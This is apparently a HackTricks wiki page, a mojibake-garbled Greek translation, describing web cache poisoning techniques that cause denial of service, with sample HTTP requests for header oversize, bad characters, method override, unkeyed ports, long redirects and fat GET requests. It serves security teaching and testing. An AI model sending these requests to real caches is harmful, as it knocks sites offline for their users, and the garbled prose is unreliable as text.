# Cache Poisoning to DoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="danger" %}
Î£Îµ Î±Ï…Ï„Î® Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Ï€Î±ÏÎ±Î»Î»Î±Î³Î­Ï‚ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿Î½ **web server Î½Î± Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹ Î¼Îµ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î±** ÏƒÎµ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ **Î­Î³ÎºÏ…ÏÎ± Î³Î¹Î± Ï„Î¿Ï…Ï‚ cache servers**
{% endhint %}

* **HTTP Header Oversize (HHO)**

Î£Ï„ÎµÎ¯Î»Ï„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î¼Îµ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´Î±Ï‚ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Î¿ web server Î±Î»Î»Î¬ Î¼Î¹ÎºÏÏŒÏ„ÎµÏÎ¿ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Î¿ cache server. ÎŸ web server Î¸Î± Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹ Î¼Îµ Î¼Î¹Î± 400 Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„ÎµÎ¯ ÏƒÏ„Î·Î½ cache:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Character (HMC) & Unexpected values**

Î£Ï„ÎµÎ¯Î»Ï„Îµ Î¼Î¹Î± ÎºÎµÏ†Î±Î»Î¯Î´Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ¿ÏÏ‚ **Î²Î»Î±Î²ÎµÏÎ¿ÏÏ‚ Î¼ÎµÏ„Î±Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚** ÏŒÏ€Ï‰Ï‚ ÎºÎ±Î¹ . Î“Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ·, Ï€ÏÎ­Ï€ÎµÎ¹ Ï€ÏÏÏ„Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Ï„Î·Î½ ÎºÏÏ…Ï†Î® Î¼Î½Î®Î¼Î·.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
ÎˆÎ½Î±Ï‚ ÎºÎ±ÎºÏÏ‚ Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½Î¿Ï‚ Ï„Î¯Ï„Î»Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ `\:` Ï‰Ï‚ Ï„Î¯Ï„Î»Î¿Ï‚.

Î‘Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î±Î½ ÏƒÏ„Î±Î»Î¿ÏÎ½ Î±Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚, ÏŒÏ€Ï‰Ï‚ Î¼Î¹Î± Î±Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„Î· Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Unkeyed header**

ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎ¿Ï…Î½ Î­Î½Î±Î½ ÎºÏ‰Î´Î¹ÎºÏŒ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î¿Ï‚ Î±Î½ **Î´Î¿Ï…Î½ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± headers** ÏƒÏ„Î·Î½ Î±Î¯Ï„Î·ÏƒÎ· ÏŒÏ€Ï‰Ï‚ Î¼Îµ Ï„Î¿ _X-Amz-Website-Location-Redirect: someThing_ header:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP Method Override Attack (HMO)**

Î‘Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„Î·Î½ Î±Î»Î»Î±Î³Î® Ï„Î·Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… HTTP Î¼Îµ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ `X-HTTP-Method-Override`, `X-HTTP-Method` Î® `X-Method-Override`. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î¶Î·Ï„Î·Î¸ÎµÎ¯ Î¼Î¹Î± Î­Î³ÎºÏ…ÏÎ· ÏƒÎµÎ»Î¯Î´Î± Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î½Î± Î¼Î·Î½ Ï„Î·Î½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹, Î¼Îµ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Î¼Î¹Î± ÎºÎ±ÎºÎ® Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„ÎµÎ¯ ÏƒÏ„Î·Î½ cache:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Unkeyed Port**

Î‘Î½ Î· Î¸ÏÏÎ± ÏƒÏ„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± Host Î±Î½Ï„Î¹ÎºÎ±Ï„Î¿Ï€Ï„ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· ÎºÎ±Î¹ Î´ÎµÎ½ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï„Î·Ï‚ cache, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï„Î·Î½ Î±Î½Î±ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½Î¿Ï…Î¼Îµ ÏƒÎµ Î¼Î¹Î± Î¼Î· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼ÎµÎ½Î· Î¸ÏÏÎ±:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

ÎŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Ï„Î¿ x Î´ÎµÎ½ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ cache, Î¿Ï€ÏŒÏ„Îµ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Ï„Î·Ï‚ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ·Ï‚ Î±Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î·Î½ Î±Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ· Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL Ï„ÏŒÏƒÎ¿ Î¼ÎµÎ³Î¬Î»Î· Ï€Î¿Ï… Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Î­Î½Î± ÏƒÏ†Î¬Î»Î¼Î±. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¿Î¹ Î¬Î½Î¸ÏÏ‰Ï€Î¿Î¹ Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î¿ÏÎ½ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î¿ uncached x key Î¸Î± Î»Î¬Î²Î¿Ï…Î½ Ï„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· ÏƒÏ†Î¬Î»Î¼Î±Ï„Î¿Ï‚:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **ÎšÎ±Î½Î¿Î½Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€ÎµÎ¶ÏÎ½ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÏ‰Î½ Ï„Î·Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´Î±Ï‚ host**

Î— ÎºÎµÏ†Î±Î»Î¯Î´Î± host Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±Î½ÎµÎ¾Î¬ÏÏ„Î·Ï„Î· Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î±Î»Î»Î¬ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Î±Î½Î±Î¼Î­Î½Î¿Ï…Î½ ÏŒÏ„Î¹ Î¸Î± ÎµÎ¯Î½Î±Î¹ Ï€ÎµÎ¶Î¬, ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†Î¿Î½Ï„Î±Ï‚ ÏƒÏ†Î¬Î»Î¼Î± Î±Î½ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **ÎšÎ±Î½Î¿Î½Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚**

ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎ¿Ï…Î½ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î¿Ï‚ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Î± URLencode ÏƒÏ„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î®, Ï‰ÏƒÏ„ÏŒÏƒÎ¿, Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ cache Î¸Î± URLdecode Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÎºÎ±Î¹ Î¸Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÏƒÎµÎ¹ Ï„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Î³Î¹Î± Ï„Î· URLdecoded Î´Î¹Î±Î´ÏÎ¿Î¼Î®:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î¿Î¹ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ cache, ÏŒÏ€Ï‰Ï‚ Î· Cloudflare, Î® Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ Î¹ÏƒÏ„Î¿Ï, ÏƒÏ„Î±Î¼Î±Ï„Î¿ÏÎ½ Ï„Î± GET Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î¼Îµ ÏƒÏÎ¼Î±, Î¿Ï€ÏŒÏ„Îµ Î±Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î³Î¹Î± Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÏƒÎµÎ¹ Î¼Î¹Î± Î¼Î· Î­Î³ÎºÏ…ÏÎ· Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
